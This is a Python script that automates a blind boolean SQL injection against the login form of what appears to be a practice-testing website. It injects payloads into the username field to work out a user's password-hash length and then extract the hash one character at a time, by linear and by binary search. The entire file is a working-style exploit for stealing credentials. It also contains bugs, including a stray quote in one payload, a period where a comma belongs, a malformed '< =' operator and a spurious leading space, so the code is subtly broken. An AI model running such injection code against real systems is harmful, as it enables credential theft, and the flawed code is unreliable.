#Automating performing a sql injection
#defining a function to implement the binary search theory 
# binary search would reduce the number of query to find the hash
import requests

total_queries = 0 # total number of queries that we make
charset = "0123456789abcdef" #can be ammended when needed 
target = "https://practicetestautomation.com/practice-test-login/"
needle = "Logged In Successfully"

# injecting the payload to see whether the query is valid or invalid 
def injected_query(payload):
	global total_queries
	r = requests.post(target, data = {"username":"student' and {} -- ".format(payload), "password":"Password123"})
	total_queries += 1
	return needle.encode() not in r.content

# query to see at a certain offset whether the character is valid or invalid 
def boolean_query(offset, user_id, character, operator=">"):
	payload = "(select hex(substr(password, {}, 1))from user where id = {}) {} hex('{}'')".format(offset+1, user_id, operator, character) 
	return(injected_query(payload)) # this payload gets send through the injected query function

# function to see whether the user id is valid or not
def invalid_user(user_id):
	payload = "(select id from user where id = {}) >= 0".format(user_id)
	return injected_query(payload)

	# two payload which both uses same injected query function to interact and tell us whether it is a success

#we use this function to identify the length of user's password's hash by making a guess starting at 0 and incrementing that guess until the response is false and we know the previous length is the length of the hash
def password_length(user_id):
	i = 0
	while True:
		payload = "(select length (password) from user where id = {} and length (password) < = {} limit 1)".format(user_id, i)
		if not injected_query(payload):
			return i 
		i += 1

# By using the password length, we use every character in the charset and identify the character is valid and at the index
def extract_hash(charset, user_id, password_length):
	found = ""
	for i in range(0 , password_length): # iterating using the length of the password as we need to identify correct value for the particular index
		for j in range(len(charset)): # we are taking each value from the charset and seeing if it is true or false based on the below boolean query
			if boolean_query(i, user_id, charset[j]):
				found += charset[j]
				break
	return found

# Function for doing binary search theory

def extract_hash_bst(charset, user_id, password_length):
	found = " "
	for index in range(0, password_length):
		start = 0
		end = len(charset) -1 
		while start <= end:
			if end - start == 1:
				if start == 0 and boolean_query(index, user_id, charset[start]):
					found += charset[start]
				else:
					found += charset[start + 1]
				break
			else:
				middle = (start+end) // 2
				if boolean_query(index,user_id,charset[middle]):
					end = middle
				else:
					start = middle
	return found


# for debugging and logging, we could see how many queries where taken
def total_queries_taken():
	global total_queries
	print ("\t \t [!] {} total queries !".format(total_queries))
	total_queries = 0

#Interacting with the functions 

while  True:
	try:
		user_id = input (" > Enter a user_id to extract the password hash: ")
		if not invalid_user(user_id):
			user_pass_length = password_length(user_id)
			print("\t [-] User {} hash length : {}".format(user_id, user_pass_length))
			total_queries_taken()
			print("\t [-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id. user_pass_length))))
			total_queries_taken()
			print("\t [x] User {} hash: {}".format(user_id, extract_hash_bst(charset, int(user_id), user_pass_length)))
			total_queries_taken()
		else:
			print("\t [X] User {} does not exist !".format(user_id))

	except KeyboardInterrupt:
		break
